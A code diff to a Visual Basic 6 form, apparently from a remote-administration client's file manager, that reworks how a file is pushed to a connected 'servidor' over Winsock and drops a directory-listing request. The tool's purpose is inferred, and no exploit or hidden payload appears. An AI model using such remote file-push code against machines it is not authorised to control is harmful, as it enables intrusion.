@@ -89,18 +89,21 @@ Attribute VB_Exposed = False
 Private Declare Function PathFileExists Lib "shlwapi" Alias "PathFileExistsA" (ByVal lppath As String) As Boolean
 Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewSource As String, ByVal lpSobreexisting As Boolean) As Boolean
 Private Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpExistingFileName As String) As Boolean
+Private Declare Function Sleep Lib "kernel32" (ByVal dwMilliseconds As Long) As Long
 
 Dim vIndex As Variant
 Dim Index_n As Integer
 
 Dim extension As String
 Dim arrData() As Byte
+Dim dataToAppear As String
 Dim size As Long
 
 Private Sub Command1_Click()
 fmanager.Enabled = True
 Unload Me
 End Sub
+
 
 Private Sub Command2_Click()
     If Form1.Winsock1(vIndex(0)).state = sckConnected Then
@@ -114,11 +117,10 @@ Private Sub Command2_Click()
         'falta configurar el envio del archivo.
         'mandamos la instruccion para que el servidor acepte nuestro archivo!
         
-        Form1.Winsock1(vIndex(0)).SendData "fil" & extension & "*" & FileLen(Form2.file.FileName) & "+" & path.Text
-        MsgBox "Enviando archivo al servidor", vbInformation + vbOKOnly, "Envio en proceso"
-
+        dataToAppear = "fil" & extension & "*" & FileLen(Form2.file.FileName) & "+" & path.Text
+        Form1.Winsock1(vIndex(0)).SendData (dataToAppear)
         CopyFile Form2.file.FileName, App.path & "\gen." & extension, True
-
+    
         Open App.path & "\gen." & extension For Binary Access Read As #1
         size = LOF(1)
         
@@ -131,16 +133,10 @@ Private Sub Command2_Click()
         ReDim arrData(size - 1)
         Get #1, , arrData
         Close
-
-        Form1.Winsock1(vIndex(0)).SendData arrData
+        
+        Form1.Winsock1(vIndex(0)).SendData (arrData)
         fmanager.XP_ProgressBar1.Max = FileLen(App.path & "\gen." & extension)
         DeleteFile App.path & "\gen." & extension
-        
-        If Form1.Winsock1(vIndex(0)).state = sckConnected Then
-    
-            fmanager.arch.ListItems.Clear
-            Form1.Winsock1(vIndex(0)).SendData "diz" & Label1.Caption & "*"
-        End If
         
         fmanager.Enabled = True
         
